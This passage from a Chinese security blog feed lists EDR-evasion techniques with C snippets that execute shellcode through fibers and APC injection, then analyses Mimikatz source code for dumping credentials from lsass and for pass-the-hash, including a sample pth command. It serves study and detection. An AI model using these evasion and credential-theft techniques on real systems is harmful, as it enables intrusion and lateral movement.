</span>Delivery[ScareCrow]:这个没太看懂，应该是一种远程命令执行，或者远程数据传递的技术吧。</div><div class="line"><span class="bullet">* </span>AntiDebug[PEzor]:反调试</div><div class="line"><span class="bullet">* </span>unhook[PEzor]:移除部分用户层Hook</div><div class="line"><span class="bullet">* </span>syscalls[PEzor，Nimcrypt2等]:syscall 规避用户层Hook</div><div class="line"><span class="bullet">* </span>Shellcode和函数名加密[charlotte,FourEye,inceptor等等]</div><div class="line"><span class="bullet">* </span>API动态调用[charlotte]:charlotte所指的动态调用是指使用GetProcAddress获取函数地址后，然后调用。</div><div class="line"><span class="bullet">* </span>正常文件插入shellcode[Sh3llter,msf,cobaltstrike旧版本]：可以有效降低信息熵，但是cs在近几个版本中取消了。</div><div class="line"><span class="bullet">* </span>Fiber(纤程)和APC[FourEye，Nimcrypt2]：FourEye的这几种方法都是在处理调用shellcode如何实现免杀，常见的直接调用shellcode不容易绕过EDR。</div><div class="line"><span class="code">    * Fiber这个方案主要调用CreateFiber创建一个纤程对象，然后调用SwitchToFiber选择即可。</span></div><div class="line"><span class="code">    * APC这个方案就是调用QueueUserAPC插入一个APC到队列中</span></div><div class="line"><span class="bullet">* </span>Ntdll ByPass</div><div class="line"><span class="bullet">* </span>通过一些不常见的语言Nim来减少特征[Nimcrypt2]</div><div class="line"><span class="bullet">* </span>系统调用名称随机化[Nimcrypt2]:就是在获取API函数地址的时候，使用随机的函数名称，这样减缓分析进度。</div><div class="line"><span class="bullet">* </span>LLVM混淆[Nimcrypt2]</div></pre></td></tr></table></figure></p><p>//Fiber<br>PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>memcpy(shellcodeLocation, shellcode, sizeof shellcode);<br>PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);<br>SwitchToFiber(shellcodeFiber);<br>//APC<br>char<em> buffer = (char</em>)Allocate(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>CopyMemory(buffer, shellcode, shellcode_size);<br>QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);<br>```</p><ul><li>===&gt;[TODO]如果要学怎么写一个免杀框架，<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">inceptor</a>是一个很好地学习例子。</li><li>Ref:<a href="https://github.com/klezVirus/inceptor" target="_blank" rel="external">https://github.com/klezVirus/inceptor</a></li><li>Ref:<a href="https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13" target="_blank" rel="external">https://assume-breach.medium.com/home-grown-red-team-testing-common-av-evasion-with-pe-packers-on-windows-11-a2a9e873fe13</a></li><li>Ref:<a href="https://www.1ight.top/纤程注入shellcode/" target="_blank" rel="external">https://www.1ight.top/纤程注入shellcode/</a></li></ul><h2 id="0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"><a href="#0x06-攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK" class="headerlink" title="0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK"></a>0x06 攻击技术研判｜发现新招！攻击者投递伪装成文件夹的恶意LNK</h2><ul><li>就是利用社会工程学伪装lnk执行后续恶意dll。</li><li><a href="https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA" target="_blank" rel="external">https://mp.weixin.qq.com/s/rCEoKdi-_qLWw86vZKrVWA</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-企业级EDR绕过技术&quot;&gt;&lt;a href=&quot;#0x01-企业级EDR绕过技术&quot; class=&quot;headerlink&quot; title=&quot;0x01 企业级EDR绕过技术&quot;&gt;&lt;/a&gt;0x01 企业级EDR绕过技术&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;原文名称：A blueprint for evading industry leading endpoint protection in 2022&lt;/li&gt;
&lt;li&gt;作者主要介绍了规避现代EDR的几种常见思路&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Mimikatz原理分析和检测</title>
    <link href="https://findream.github.io/2022/04/22/Mimikatz%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E6%A3%80%E6%B5%8B/"/>
    <id>https://findream.github.io/2022/04/22/Mimikatz原理分析和检测/</id>
    <published>2022-04-22T06:02:11.000Z</published>
    <updated>2022-05-23T11:58:32.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>这是学习Mimikatz工作原理的无总结笔记。主要包含了<code>sekurlsa::msv</code>,<code>sekurlsa::pth</code>,<code>lsadump::dcsync</code>,票据传递等功能的原理分析和检测。<a id="more"></a></li></ul><h2 id="sekurlsa-msv源码分析"><a href="#sekurlsa-msv源码分析" class="headerlink" title="sekurlsa::msv源码分析"></a>sekurlsa::msv源码分析</h2><ul><li>Mimikatz的sekurlsa::msv命令是用于获取NTLM协议加密的凭证</li><li>其在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中实现。</li><li>具体原理是通过特征码定位Lsass.exe进程的lsasvr.dll中的LogonSessionList全局变量和LogonSessionListCount全局变量的地址，然后解析LogonSessionList结构体即可，LogonSessionList是一个双向链表(LIST_ENTRY)。</li><li><p>在NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)函数中，首先调用kuhl_m_sekurlsa_acquireLSA()函数用于获取相关模块信息，主要是在kull_m_process_getVeryBasicModuleInformations()函数中，通过PEB获取指定的lsasvr.dll基地址。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">moduleInformation.NameDontUseOutsideCallback</span> = &amp;moduleName<span class="comment">;</span></div><div class="line"><span class="symbol">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrData; </span>aProcess.<span class="keyword">address </span>= Peb.<span class="keyword">Ldr;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrData)))</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">for(</div><div class="line">aLire  = (PBYTE) (<span class="keyword">LdrData.InMemoryOrderModulevector.Flink) </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks),</div><div class="line">fin    = (PBYTE) (Peb.<span class="keyword">Ldr) </span>+ FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector)<span class="comment">;</span></div><div class="line">(aLire != fin) &amp;&amp; continueCallback<span class="comment">;</span></div><div class="line">aLire  = (PBYTE) <span class="keyword">LdrEntry.InMemoryOrderLinks.Flink </span>- FIELD_OFFSET(<span class="keyword">LDR_DATA_TABLE_ENTRY, </span>InMemoryOrderLinks)</div><div class="line">)</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= &amp;<span class="keyword">LdrEntry; </span>aProcess.<span class="keyword">address </span>= aLire<span class="comment">;</span></div><div class="line"><span class="meta">if</span>(continueCallback = kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(<span class="keyword">LdrEntry)))</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">moduleInformation.DllBase.<span class="keyword">address </span>= <span class="keyword">LdrEntry.DllBase;</span></div><div class="line"><span class="keyword"></span>moduleInformation.SizeOfImage = <span class="keyword">LdrEntry.SizeOfImage;</span></div><div class="line"><span class="keyword"></span>moduleName = <span class="keyword">LdrEntry.BaseDllName;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(moduleName.<span class="keyword">Buffer </span>= (PWSTR) LocalAlloc(LPTR, moduleName.MaximumLength))</div><div class="line">&#123;</div><div class="line">aBuffer.<span class="keyword">address </span>= moduleName.<span class="keyword">Buffer; </span>aProcess.<span class="keyword">address </span>= <span class="keyword">LdrEntry.BaseDllName.Buffer;</span></div><div class="line"><span class="keyword"></span><span class="meta">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, moduleName.MaximumLength))</div><div class="line">&#123;</div><div class="line">kull_m_process_adjustTimeDateStamp(&amp;moduleInformation)<span class="comment">;</span></div><div class="line">continueCallback = callBack(&amp;moduleInformation, pvArg)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">LocalFree(moduleName.<span class="keyword">Buffer);</span></div><div class="line"><span class="keyword"></span>&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">status = STATUS_SUCCESS<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后通过kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList全局变量和LogonSessionListCount全局变量的地址,其中LsaSrvReferences数组存储着不同系统版本的索引特征码(位于kuhl_m_sekurlsa_utils.c文件中)</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)</div><div class="line">&#123;</div><div class="line">PVOID *pLogonSessionListCount = (cLsass-&gt;osContext.BuildNumber &lt; KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &amp;LogonSessionListCount);</div><div class="line">return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &amp;LogonSessionList, pLogonSessionListCount, NULL, NULL);</div><div class="line">&#125;</div><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">&#123;KULL_M_WIN_BUILD_XP,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2K3,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WN60_LogonSessionList),PTRN_WN60_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">21</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_7,&#123;sizeof(PTRN_WN61_LogonSessionList),PTRN_WN61_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">19</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_8,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_BLUE,&#123;sizeof(PTRN_WN63_LogonSessionList),PTRN_WN63_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">36</span>,  -<span class="number">6</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1507,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">16</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1703,&#123;sizeof(PTRN_WN1703_LogonSessionList),PTRN_WN1703_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1803,&#123;sizeof(PTRN_WN1803_LogonSessionList),PTRN_WN1803_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_10_1903,&#123;sizeof(PTRN_WN6x_LogonSessionList),PTRN_WN6x_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">23</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2022,&#123;sizeof(PTRN_WN11_LogonSessionList),PTRN_WN11_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;<span class="number">24</span>,  -<span class="number">4</span>&#125;&#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></li><li><p>此时LogonSessionListCount，LogonSessionList两个变量，仅仅表示的是其在内存中的地址。需要通过kull_m_memory_copy获取其值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="title">securityStruct</span>.hMemory = cLsass.hLsassMem;</div><div class="line"><span class="title">if</span>(securityStruct.address = <span class="type">LogonSessionListCount</span>)       </div><div class="line">kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">ULONG</span>));   //<span class="keyword">data</span>-&gt;address 保存的是<span class="type">LogonSessionListCount</span>的值</span></div><div class="line"><span class="title">for</span>(i = <span class="number">0</span>; i &lt; nbListes; i++)</div><div class="line">&#123;</div><div class="line">securityStruct.address = &amp;<span class="type">LogonSessionList</span>[i];</div><div class="line"><span class="class"><span class="keyword">data</span>.address = &amp;pStruct;</span></div><div class="line"><span class="class"><span class="keyword">data</span>.hMemory = &amp;<span class="type">KULL_M_MEMORY_GLOBAL_OWN_HANDLE</span>;</span></div><div class="line"><span class="keyword">if</span>(aBuffer.address = <span class="type">LocalAlloc</span>(<span class="type">LPTR</span>, helper-&gt;tailleStruct))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_memory_copy(&amp;<span class="class"><span class="keyword">data</span>, &amp;securityStruct, sizeof(<span class="type">PVOID</span>)))   //securityStruct.address 保存的是<span class="type">LogonSessionList</span>数组地址</span></div><div class="line"> .....</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后第三次调用kull_m_memory_copy()函数，获取双向链表的第一个节点,aBuffer.address就是第一个节点的地址。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">if</span>(kull_m_memory_copy(&amp;aBuffer, &amp;<span class="keyword">data</span>, helper-&gt;</span>tailleStruct))<span class="comment">//aBuffer.address指向的是LogonSessionList双向列表的某个节点</span></div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonId= (PLUID)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLuid);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonType= *((PULONG)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonType));</div><div class="line"><span class="function"><span class="title">sessionData</span>.Session= *((PULONG)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToSession));</div><div class="line"><span class="function"><span class="title">sessionData</span>.UserName= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToUsername);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonDomain= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToDomain);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pCredentials= *(PVOID *)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentials);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pSid= *(PSID *)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToPSid);</div><div class="line"><span class="function"><span class="title">sessionData</span>.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToCredentialManager);</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonTime= *((PFILETIME)((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonTime));</div><div class="line"><span class="function"><span class="title">sessionData</span>.LogonServer= (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;</span>offsetToLogonServer);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure><p> <img src="http://hacky.wang/blog/20220215/7ozemelppDsx.png?imageslim" alt="mark"></p></li></ul><h2 id="Pass-the-Hash攻击-传递Hash攻击"><a href="#Pass-the-Hash攻击-传递Hash攻击" class="headerlink" title="Pass the Hash攻击(传递Hash攻击)"></a>Pass the Hash攻击(传递Hash攻击)</h2><ul><li><p>哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证(攻击者无须通过解密hash值来获取明文密码。)，以此来横向访问其他网络系统。 </p></li><li><p>在Windows中创建密码后，密码经过哈希化处理后存储在安全账户管理器(SAM)，本地安全机构子系统(LSASS)进程内存,凭据管理器(CredManage),Active Directory中的ntds.dit数据库或者其他地方。因此，当用户登录windows工作站或服务器时，他们实际上会留下密码凭据(hash)。</p></li><li><p>但是hash的获取是固定存在的，因为window中经常需要用hash来进行验证和交互。所以利用hash来进行横向移动在内网渗透中经常充当主力的角色。</p></li></ul><h2 id="sekurlsa-pth源码分析"><a href="#sekurlsa-pth源码分析" class="headerlink" title="sekurlsa::pth源码分析"></a>sekurlsa::pth源码分析</h2><ul><li>Mimikatz的sekurlsa::pth命令主要用户进行Pass The Hash攻击，其实现在mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c中的kuhl_m_sekurlsa_pth函数。</li><li>命令如下：<code>sekurlsa::pth /user:Administrator /domain:192.168.230.129 /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></li><li><p>首先将分别解析命令行所传递的参数，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"luid"</span>, &amp;szLuid, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">tokenStats.AuthenticationId.HighPart = <span class="number">0</span>; <span class="comment">// because I never saw it != 0</span></div><div class="line">tokenStats.AuthenticationId.LowPart = wcstoul(szLuid, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"user"</span>, &amp;szUser, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, <span class="string">L"domain"</span>, &amp;szDomain, <span class="literal">NULL</span>))</div><div class="line">&#123;</div><div class="line">isImpersonate = kull_m_string_args_byName(argc, argv, <span class="string">L"impersonate"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">kull_m_string_args_byName(argc, argv, <span class="string">L"run"</span>, &amp;szRun, isImpersonate ? _wpgmptr : <span class="string">L"cmd.exe"</span>);</div><div class="line">kprintf(<span class="string">L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n"</span>, szUser, szDomain, szRun, isImpersonate ? <span class="string">L"yes"</span> : <span class="string">L"no"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : domain\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(<span class="string">L"Missing argument : user\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>关于散列，一共可以有4种不同的类型可以选择，分别是aes128，aes256，ntlm，rc4。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(kull_m_string_args_byName(argc, argv, L<span class="string">"rc4"</span>, &amp;szNTLM, <span class="built_in">NULL</span>) || kull_m_string_args_byName(argc, argv, L<span class="string">"ntlm"</span>, &amp;szNTLM, <span class="built_in">NULL</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))</div><div class="line">&#123;</div><div class="line"><span class="built_in">data</span>.NtlmHash = ntlm;</div><div class="line">kprintf(L<span class="string">"NTLM\t: "</span>); kull_m_string_wprintf_hex(<span class="built_in">data</span>.NtlmHash, LM_NTLM_HASH_LENGTH, <span class="number">0</span>); kprintf(L<span class="string">"\n"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(L<span class="string">"ntlm hash/rc4 key length must be 32 (16 bytes)\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>接着，调用kull_m_process_create()函数，kull_m_process_create()函数参数主要有</p><ul><li>szRun：需要运行的程序</li><li>szUser：用户名</li><li>szDomain：域</li><li>szPassword：密码(此处密码为空)<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(<span class="name">kull_m_process_create</span>(<span class="name">KULL_M_PROCESS_CREATE_LOGON</span>, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L<span class="string">""</span>, <span class="symbol">&amp;processInfos</span>, FALSE))</div></pre></td></tr></table></figure></li></ul></li><li><p>在kull_m_process_create()函数中，调用CreateProcessWithLogonW()创建一个进程。CreateProcessWithLogonW可以使用指定的凭证信息创建进程。但是传递的Password值是空的，以便后续填充。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">case</span> <span class="attr">KULL_M_PROCESS_CREATE_LOGON:</span></div><div class="line"><span class="string">status</span> <span class="string">=</span> <span class="string">CreateProcessWithLogonW(user,</span> <span class="string">domain,</span> <span class="string">password,</span> <span class="string">iLogonFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">dupCommandLine,</span> <span class="string">iProcessFlags,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">&amp;startupInfo,</span> <span class="string">ptrProcessInfos);</span></div><div class="line"><span class="string">break;</span></div><div class="line"><span class="string">&#125;</span></div></pre></td></tr></table></figure></li><li><p>接着调用kuhl_m_sekurlsa_pth_luid()函数，kuhl_m_sekurlsa_pth_luid()携带的参数是一个PSEKURLSA_PTH_DATA结构，其中包含6个成员。LogonId为登录的id，NtlmHash为NTLM散列，也就是常规Pth传入的值。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">typedef struct _SEKURLSA_PTH_DATA &#123; </div><div class="line"><span class="type">PLUID</span><span class="type">LogonId</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">NtlmHash</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">Aes256Key</span>;</div><div class="line"><span class="type">LPBYTE</span><span class="type">Aes128Key</span>;</div><div class="line"><span class="type">BOOL</span>isReplaceOk;</div><div class="line">&#125; <span class="type">SEKURLSA_PTH_DATA</span>, *<span class="type">PSEKURLSA_PTH_DATA</span>;</div></pre></td></tr></table></figure></li><li><p>kuhl_m_sekurlsa_pth_luid()首先会调用kuhl_m_sekurlsa_acquireLSA()，该函数首先会遍历Lsass.exe进程的模块，根据不同的sekurlsa模块不同的命令，选择不同的模块。例如msv命令就是寻找lsasvr.dll这个模块<br>  <img src="http://hacky.wang/blog/20220217/3PHnIpOeBOLI.png?imageslim" alt="mark"></p></li><li><p>kuhl_m_sekurlsa_acquireLSA()主要调用kull_m_process_getVeryBasicModuleInformations()函数通过PEB的Ldr列表获取指定模块的信息，主要是模块的基地址。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">case KULL_M_MEMORY_TYPE_OWN:</div><div class="line"><span class="keyword">if</span>(kull_m_process_peb(memory, &amp;Peb, FALSE))</div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">for</span>(pLdrEntry  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr-&gt;</span>InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));</div><div class="line">(pLdrEntry != (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector))) &amp;&amp; continueCallback;</div><div class="line"><span class="function"><span class="title">pLdrEntry</span>  = (PLDR_DATA_TABLE_ENTRY) ((PBYTE) (pLdrEntry-&gt;</span>InMemoryOrderLinks.Flink ) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))</div><div class="line">)</div><div class="line">&#123;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.DllBase.address = pLdrEntry-&gt;</span>DllBase;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.SizeOfImage = pLdrEntry-&gt;</span>SizeOfImage;</div><div class="line"><span class="function"><span class="title">moduleInformation</span>.NameDontUseOutsideCallback = &amp;pLdrEntry-&gt;</span>BaseDllName;</div><div class="line">kull_m_process_adjustTimeDateStamp(&amp;moduleInformation);</div><div class="line">continueCallback = callBack(&amp;moduleInformation, pvArg);</div><div class="line">&#125;</div><div class="line">status = STATUS_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>  <img src="http://hacky.wang/blog/20220217/CXUrtKPGnsJt.png?imageslim" alt="mark"></p></li><li><p>调用kuhl_m_sekurlsa_utils_search()函数搜索LogonSessionList的特征码，LogonSessionList结构体包含了登录会话的诸多信息。其主要会调用kuhl_m_sekurlsa_utils_search_generic()函数。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">KULL_M_PATCH_GENERIC LsaSrvReferences[] = &#123;</div><div class="line">&#123;KULL_M_WIN_BUILD_XP,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>,   <span class="number">0</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_2K3,&#123;sizeof(PTRN_WIN5_LogonSessionList),PTRN_WIN5_LogonSessionList&#125;,&#123;<span class="number">0</span>, NULL&#125;, &#123;-<span class="number">4</span>, -<span class="number">45</span>&#125;&#125;,</div><div class="line">&#123;KULL_M_WIN_BUILD_VISTA,&#123;sizeof(PTRN_WN60_LogonSessionList),PTRN_WN60_LogonSessionList&#125;,&#123;<span 